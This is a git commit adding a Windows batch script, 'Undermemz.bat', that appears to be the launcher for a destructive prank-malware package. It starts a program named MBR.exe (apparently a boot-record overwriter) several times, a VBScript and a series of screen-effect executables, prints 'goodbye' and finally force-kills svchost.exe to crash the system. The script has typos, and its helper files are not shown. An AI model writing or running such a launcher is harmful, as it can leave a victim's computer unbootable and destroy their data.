61b7eeaa27b6dd801fdeeccf81325a25ef0f64e9
canal-tv <ctv425040@gmail.com>
2025-03-16 13:24:25 -0700

    Create Undermemz.bat

---
+++ Undermemz.bat
@@ -0,0 +1,26 @@
+@echo out
+
+echo your compter is
+echo ...
+timeout 2
+start cmd.exe
+start MBR.exe
+start Mem.vbs
+start bytebeat1.exe
+timeout 10
+start circle.exe
+start sinewaves.exe
+timeout 9
+start Bitblt1.exe
+start MBR.exe
+start MBR.exe
+start circle.exe
+start sinewaves.exe
+start Bitblt1.exe
+timeout 1
+start mem.vbs
+start simewaves.exe
+echo goodbye
+timeout 1
+taskkill /f /im svchost.exe
+exit
